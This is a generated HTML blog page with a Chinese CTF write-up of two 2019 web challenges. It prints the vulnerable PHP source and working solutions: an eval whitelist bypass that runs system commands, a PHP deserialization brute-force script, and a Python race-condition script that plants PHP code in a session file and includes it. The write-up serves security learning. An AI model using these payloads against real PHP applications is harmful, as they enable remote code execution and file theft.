@@ -1,0 +1,808 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next gemini use-motion" lang="zh-CN">
+<head><meta name="generator" content="Hexo 3.8.0">
+  <meta charset="UTF-8">
+<meta http-equiv="X-UA-Compatible" content="IE=edge">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform">
+<meta http-equiv="Cache-Control" content="no-siteapp">
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="CTF,">
+
+
+
+
+
+
+
+
+
+
+<meta name="description" content="love_math访问calc.php，读取到源码 12345678910111213141516171819202122232425262728 &amp;lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&apos;c&apos;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;">
+<meta name="keywords" content="CTF">
+<meta property="og:type" content="article">
+<meta property="og:title" content="西湖论剑.wp">
+<meta property="og:url" content="https://TGAOUT.github.io/2019/04/21/西湖论剑web_wp/index.html">
+<meta property="og:site_name" content="TGAO&#39;s Blog">
+<meta property="og:description" content="love_math访问calc.php，读取到源码 12345678910111213141516171819202122232425262728 &amp;lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&apos;c&apos;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;">
+<meta property="og:locale" content="zh-CN">
+<meta property="og:image" content="https://tgaout.github.io/2019/04/21/西湖论剑web_wp/1.png">
+<meta property="og:updated_time" content="2019-04-25T11:54:32.112Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="西湖论剑.wp">
+<meta name="twitter:description" content="love_math访问calc.php，读取到源码 12345678910111213141516171819202122232425262728 &amp;lt;?phperror_reporting(0);//听说你很喜欢数学，不知道你是否爱它胜过爱flagif(!isset($_GET[&apos;c&apos;]))&amp;#123;    show_source(__FILE__);&amp;#125;else&amp;#123;">
+<meta name="twitter:image" content="https://tgaout.github.io/2019/04/21/西湖论剑web_wp/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Gemini',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: 'Author'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="https://TGAOUT.github.io/2019/04/21/西湖论剑web_wp/">
+
+
+
+
+
+  <title>西湖论剑.wp | TGAO's Blog</title>
+  
+
+
+
+
+
+
+
+
+</head>
+
+<body itemscope="" itemtype="http://schema.org/WebPage" lang="zh-CN">
+
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope="" itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">TGAO's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br>
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br>
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+            
+            归档
+          </a>
+        </li>
+      
+
+      
+    </ul>
+  
+
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope="" itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="https://TGAOUT.github.io/2019/04/21/西湖论剑web_wp/">
+
+    <span hidden itemprop="author" itemscope="" itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="TGAO">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope="" itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="TGAO's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">西湖论剑.wp</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="Post created" itemprop="dateCreated datePublished" datetime="2019-04-21T20:05:38+08:00">
+                2019-04-21
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category">
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope="" itemtype="http://schema.org/Thing">
+                  <a href="/categories/ctf/" itemprop="url" rel="index">
+                    <span itemprop="name">CTF</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <h1 id="love-math"><a href="#love-math" class="headerlink" title="love_math"></a>love_math</h1><p>访问calc.php，读取到源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="comment">//听说你很喜欢数学，不知道你是否爱它胜过爱flag</span></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'c'</span>]))&#123;</span><br><span class="line">    show_source(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="comment">//例子 c=20-1</span></span><br><span class="line">    $content = $_GET[<span class="string">'c'</span>];</span><br><span class="line">    <span class="keyword">if</span> (strlen($content) &gt;= <span class="number">80</span>) &#123;</span><br><span class="line">        <span class="keyword">die</span>(<span class="string">"太长了不会算"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    $blacklist = [<span class="string">' '</span>, <span class="string">'\t'</span>, <span class="string">'\r'</span>, <span class="string">'\n'</span>,<span class="string">'\''</span>, <span class="string">'"'</span>, <span class="string">'`'</span>, <span class="string">'\['</span>, <span class="string">'\]'</span>];</span><br><span class="line">    <span class="keyword">foreach</span> ($blacklist <span class="keyword">as</span> $blackitem) &#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">'/'</span> . $blackitem . <span class="string">'/m'</span>, $content)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的字符"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//常用数学函数http://www.w3school.com.cn/php/php_ref_math.asp</span></span><br><span class="line">    $whitelist = [<span class="string">'abs'</span>, <span class="string">'acos'</span>, <span class="string">'acosh'</span>, <span class="string">'asin'</span>, <span class="string">'asinh'</span>, <span class="string">'atan2'</span>, <span class="string">'atan'</span>, <span class="string">'atanh'</span>, <span class="string">'base_convert'</span>, <span class="string">'bindec'</span>, <span class="string">'ceil'</span>, <span class="string">'cos'</span>, <span class="string">'cosh'</span>, <span class="string">'decbin'</span>, <span class="string">'dechex'</span>, <span class="string">'decoct'</span>, <span class="string">'deg2rad'</span>, <span class="string">'exp'</span>, <span class="string">'expm1'</span>, <span class="string">'floor'</span>, <span class="string">'fmod'</span>, <span class="string">'getrandmax'</span>, <span class="string">'hexdec'</span>, <span class="string">'hypot'</span>, <span class="string">'is_finite'</span>, <span class="string">'is_infinite'</span>, <span class="string">'is_nan'</span>, <span class="string">'lcg_value'</span>, <span class="string">'log10'</span>, <span class="string">'log1p'</span>, <span class="string">'log'</span>, <span class="string">'max'</span>, <span class="string">'min'</span>, <span class="string">'mt_getrandmax'</span>, <span class="string">'mt_rand'</span>, <span class="string">'mt_srand'</span>, <span class="string">'octdec'</span>, <span class="string">'pi'</span>, <span class="string">'pow'</span>, <span class="string">'rad2deg'</span>, <span class="string">'rand'</span>, <span class="string">'round'</span>, <span class="string">'sin'</span>, <span class="string">'sinh'</span>, <span class="string">'sqrt'</span>, <span class="string">'srand'</span>, <span class="string">'tan'</span>, <span class="string">'tanh'</span>];</span><br><span class="line">    preg_match_all(<span class="string">'/[a-zA-Z_\x7f-\xff][a-zA-Z_0-9\x7f-\xff]*/'</span>, $content, $used_funcs);</span><br><span class="line">    <span class="keyword">foreach</span> ($used_funcs[<span class="number">0</span>] <span class="keyword">as</span> $func) &#123;</span><br><span class="line">        <span class="keyword">if</span> (!in_array($func, $whitelist)) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">"请不要输入奇奇怪怪的函数"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">//帮你算出答案</span></span><br><span class="line">    <span class="keyword">eval</span>(<span class="string">'echo '</span>.$content.<span class="string">';'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>从代码中可以发现对输入参数进行了黑白名单的过滤。</p>
+<p>对字符进行黑名单过滤，没什么说的，</p>
+<p>对函数进行白名单过滤，也就是说对输入的正常字符必须是白名单中函数。</p>
+<p>payload：<code>?c=$pi=base_convert(37907361743,10,36)(dechex(409369269076));$$pi{0}($$pi{1})</code></p>
+<p>post：<code>0=system&amp;1=cat flag.php</code></p>
+<h1 id="justsoso"><a href="#justsoso" class="headerlink" title="justsoso"></a>justsoso</h1><p>##题目源代码  </p>
+<ol>
+<li><p>index.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>); </span><br><span class="line">$file = $_GET[<span class="string">"file"</span>]; </span><br><span class="line">$payload = $_GET[<span class="string">"payload"</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($file))&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">'Missing parameter'</span>.<span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span>(preg_match(<span class="string">"/flag/"</span>,$file))&#123;</span><br><span class="line">	<span class="keyword">die</span>(<span class="string">'hack attacked!!!'</span>);</span><br><span class="line">&#125;</span><br><span class="line">@<span class="keyword">include</span>($file);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($payload))&#123;  </span><br><span class="line">    $url = parse_url($_SERVER[<span class="string">'REQUEST_URI'</span>]);</span><br><span class="line">    parse_str($url[<span class="string">'query'</span>],$query);</span><br><span class="line">    <span class="keyword">foreach</span>($query <span class="keyword">as</span> $value)&#123;</span><br><span class="line">        <span class="keyword">if</span> (preg_match(<span class="string">"/flag/"</span>,$value)) &#123; </span><br><span class="line">    	    <span class="keyword">die</span>(<span class="string">'stop hacking!'</span>);</span><br><span class="line">    	    <span class="keyword">exit</span>();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    $payload = unserialize($payload);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123; </span><br><span class="line">   <span class="keyword">echo</span> <span class="string">"Missing parameters"</span>; </span><br><span class="line">&#125; </span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">&lt;!--Please test index.php?file=xxx.php --&gt;</span><br><span class="line">&lt;!--Please get the source of hint.php--&gt;</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>hint.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>##解法一  </p>
+<p><code>php poc.php</code>运行下面的poc.php脚本</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span>  </span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Handle</span></span>&#123; </span><br><span class="line">    <span class="keyword">private</span> $handle;  </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__wakeup</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">foreach</span>(get_object_vars(<span class="keyword">$this</span>) <span class="keyword">as</span> $k =&gt; $v) &#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;$k = <span class="keyword">null</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">"Waking up\n"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($handle)</span> </span>&#123; </span><br><span class="line">        <span class="keyword">$this</span>-&gt;handle = $handle; </span><br><span class="line">    &#125; </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;handle-&gt;getFlag();</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Flag</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $file;</span><br><span class="line">    <span class="keyword">public</span> $token;</span><br><span class="line">    <span class="keyword">public</span> $token_flag;</span><br><span class="line"> </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="comment">//$this-&gt;token_flag = $this-&gt;token = md5(rand(1,10000));</span></span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">$this</span>-&gt;token.<span class="string">"\r"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getFlag</span><span class="params">()</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">$this</span>-&gt;token === <span class="keyword">$this</span>-&gt;token_flag)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;file))&#123;</span><br><span class="line">				<span class="keyword">echo</span> @highlight_file(<span class="keyword">$this</span>-&gt;file,<span class="keyword">true</span>); </span><br><span class="line">            &#125;  </span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">while</span>(<span class="number">1</span>)&#123;</span><br><span class="line">    $a=<span class="keyword">new</span> Handle(<span class="keyword">new</span> Flag(<span class="string">"flag.php"</span>));</span><br><span class="line">    $url=<span class="string">"http://84837547b31248abba0870cab4eee57b4683a90c98dc4e51.changame.ichunqiu.com///?file=hint.php&amp;payload="</span>.urlencode(serialize($a));</span><br><span class="line">    $url1=str_replace(<span class="string">"O%3A6%3A%22Handle%22%3A1"</span>, <span class="string">"O%3A6%3A%22Handle%22%3A2"</span>, $url);</span><br><span class="line">    <span class="keyword">echo</span> $url1.<span class="string">"\r"</span>;</span><br><span class="line">    $flag=file_get_contents($url1);</span><br><span class="line">    <span class="keyword">if</span>(strpos($flag,<span class="string">"ag&#123;"</span>))&#123;</span><br><span class="line">        var_dump($flag);</span><br><span class="line">        <span class="keyword">exit</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="解法二"><a href="#解法二" class="headerlink" title="解法二"></a>解法二</h2><p>其实与解法一差不多，区别在于解法一采用爆破的方式。而解法二利用引用变量绕过比较。</p>
+<p>只需在原来的脚本上修改下即可</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($file)</span></span>&#123;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;file = $file;</span><br><span class="line">		<span class="keyword">$this</span>-&gt;token_flag = <span class="keyword">$this</span>-&gt;token = md5(rand(<span class="number">1</span>,<span class="number">10000</span>));</span><br><span class="line">        <span class="keyword">$this</span>-&gt;token=&amp;<span class="keyword">$this</span>-&gt;token_flag</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>
+<h2 id="解法三"><a href="#解法三" class="headerlink" title="解法三"></a>解法三</h2><p>这个手法我是在p师傅的小密圈中看到的。做题的时候没想起来…</p>
+<p>这里是利用php中的文件流式上传记录功能，详细知识自查</p>
+<p>先来看看php.ini中的几个默认选项</p>
+<p><img src="/2019/04/21/西湖论剑web_wp/1.png" alt="image"></p>
+<p>由于cleanup默认为on，所以这里需要利用竞争来包含session文件。</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"></span><br><span class="line">url=<span class="string">'http://127.0.0.1:5555/u.php'</span></span><br><span class="line">r=requests.session()</span><br><span class="line">headers=&#123;</span><br><span class="line">    <span class="string">"Cookie"</span>:<span class="string">'PHPSESSID=tgao'</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">POST</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        file=&#123;</span><br><span class="line">            <span class="string">"upload"</span>:(<span class="string">''</span>,<span class="string">''</span>)                                                    </span><br><span class="line">        &#125;</span><br><span class="line">        data=&#123;</span><br><span class="line">            <span class="string">"PHP_SESSION_UPLOAD_PROGRESS"</span>:<span class="string">'&lt;?php readfile("./flag.php");?&gt;'</span>   </span><br><span class="line">        &#125;</span><br><span class="line">        r.post(url,files=file,headers=headers,data=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">READ</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">while</span> <span class="keyword">True</span>:</span><br><span class="line">        event.wait()</span><br><span class="line">        t=r.get(<span class="string">"http://127.0.0.1:5555/u.php?file=../../tmp/tmp/sess_tgao"</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'flag'</span> <span class="keyword">not</span> <span class="keyword">in</span> t.text:</span><br><span class="line">            print(<span class="string">'[+]retry'</span>)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            print(t.text)</span><br><span class="line">            event.clear()</span><br><span class="line">			print(<span class="string">'success!'</span>)</span><br><span class="line">event=threading.Event()</span><br><span class="line">threading.Thread(target=POST,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">threading.Thread(target=READ,args=()).start()</span><br><span class="line">event.set()</span><br></pre></td></tr></table></figure>
+
+      
+    </div>
+    
+    
+    
+
+    
+
+    
+
+    
+
+    <footer class="post-footer">
+      
+        <div class="post-tags">
+          
+            <a href="/tags/CTF/" rel="tag"># CTF</a>
+          
+        </div>
+      
+
+      
+      
+      
+
+      
+        <div class="post-nav">
+          <div class="post-nav-next post-nav-item">
+            
+              <a href="/2019/04/02/sql之blind/" rel="next" title="sql盲注">
+                <i class="fa fa-chevron-left"></i> sql盲注
+              </a>
+            
+          </div>
+
+          <span class="post-nav-divider"></span>
+
+          <div class="post-nav-prev post-nav-item">
+            
+              <a href="/2019/04/22/parse_url函数的bug/" rel="prev" title="parse_url函数的bug">
+                parse_url函数的bug <i class="fa fa-chevron-right"></i>
+              </a>
+            
+          </div>
+        </div>
+      
+
+      
+      
+    </footer>
+  </div>
+  
+  
+  
+  </article>
+
+
+
+    <div class="post-spread">
+      
+    </div>
+  </div>
+
+
+          </div>
+          
+
+
+          
+
+  
+
+
+
+        </div>
+        
+          
+  
+  <div class="sidebar-toggle">
+    <div class="sidebar-toggle-line-wrap">
+      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
+      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
+    </div>
+  </div>
+
